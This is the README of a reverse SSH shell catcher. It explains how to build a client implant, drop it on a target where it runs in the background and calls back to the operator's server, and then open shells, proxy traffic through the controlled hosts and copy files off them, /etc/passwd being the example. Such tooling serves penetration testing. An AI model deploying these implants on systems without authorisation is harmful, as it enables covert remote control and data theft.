# Reverse SSH

Ever wanted to use SSH to talk to your reverse shells? Well now you can. Essentially works like any reverse shell catcher thing. 
You, the human client connect to the reverse shell catcher with ssh, and then select which remote host you want to connect to. 

```
                    +----------------+                 +---------+
                    |                |                 |         |
                    |                |       +---------+ Shelled |
                    |    Reverse     |       |         |  Client |
                    |  Connection    |       |         |         |
                    |    Catcher     |       |         +---------+
+---------+         |                |       |
|         |         |                |       |
| Human   |         |                |  SSH  |         +---------+
| Client  +-------->+                <-----------------+         |
|         |         |                |       |         | Shelled |
+---------+         |                |       |         |  Client |
                    |                |       |         |         |
                    |                |       |         +---------+
                    |                |       |
                    |                |       |
                    +----------------+       |         +---------+
                                             |         |         |
                                             |         | Shelled |
                                             +---------+  Client |
                                                       |         |
                                                       +---------+
```


## Setup Instructions

Depending on the platform that you're building the server and client for. You may need to change the GOOS and GOARCH enviroment variables. E.g building for linux:
```
GOOS=linux GOARCH=amd64 make
```

Make will build both the `client` and `server` binaries. If you're dropping the `client` binary on a target with a different architecture you will need to change this.

The server will automatically generate a private key on first use. Or you can specify one with `--key`. You will need to create an `authorized_keys` file, containing *your* public key. 
This will allow the server to authenticate you, to allow you to control whatever reverse shell connections it catches. 
```
cp ~/.ssh/id_ed25519.pub authorized_keys
./server 0.0.0.0:3232 #Set the server to listen on port 3232
```

Put the client binary on whatever you want to control. 
```
./client yourserver.com:3232
```

This will cause the client to fork into the background. If you want to montior the output for debugging purposes specify `--foreground`.  
The client will attempt to detect shells such as bash, ash, sh and execute one of those if possible. If it cant find one. Then you will be asked to enter in a path.

Then connect to your reverse shell catcher server:

```
ssh yourserver.com -p 3232
```

## Features

### Proxy

Using just the general dynamical forward `-D` flag you can proxy to your controlled hosts.

First you connect to your reverse shell catcher.

```
ssh -D 9050 catcher.com -p 3232
```

Then use the `proxy connect <remote_id>` command to connect to your reverse shell. 

```
catcher$ proxy connect 0bda3b12d3ce83f895632d412261073dc93dba3e 
Connected: 0bda3b12d3ce83f895632d412261073dc93dba3e
catcher$ 
```
After this, just point your tools/web browser to the socks5 port open on your local machine (in this example on port 9050) and you're away laughing.

You can obviously only proxy to one host at a time.


### SCP

You can transfer files to and from your controlled hosts using SCP. Essentially you address which host you want to download/upload to by `<ip_address>:<remote_id>:/path/here`.

e.g to upload the directory test to the host `0be2782caae4bedff780e14526f7618ab61e24fa`:
```
scp -r -P 3232 test catcher.com:0be2782caae4bedff780e14526f7618ab61e24fa:$(pwd -P)/test2
```

Or to download `/etc/passwd` from a host:

```
scp -P 3232 test catcher.com:0be2782caae4bedff780e14526f7618ab61e24fa:/etc/passwd
```

### Shell

On connection you will be presented by a list of controllable clients, e.g:
```
               Targets
----------------------------------------------------------
| ID                                       | IP Address  |
----------------------------------------------------------
| aee61d906398fde43034e7986ed1ee2f94bb0bf2 | [::1]:38228 |
----------------------------------------------------------
| fce2b96df94f6e0e33aab7951e2142a378df9148 | [::1]:38232 |
----------------------------------------------------------
catcher$ 
```

Use `help` or press `tab` to view commands.  
Tab will auto complete entries. 
So you you wanted to connect to the client given in the example: 
```
> connect a<TAB>
```
Will auto complete the entry for you and on enter will connect you to your reverse shell. 

## Limitations

This doesnt work entirely correctly for windows programs, due to limitations of the windows platform. But you can still run commands. 
Although they might not end properly, or be ctrl+c-able

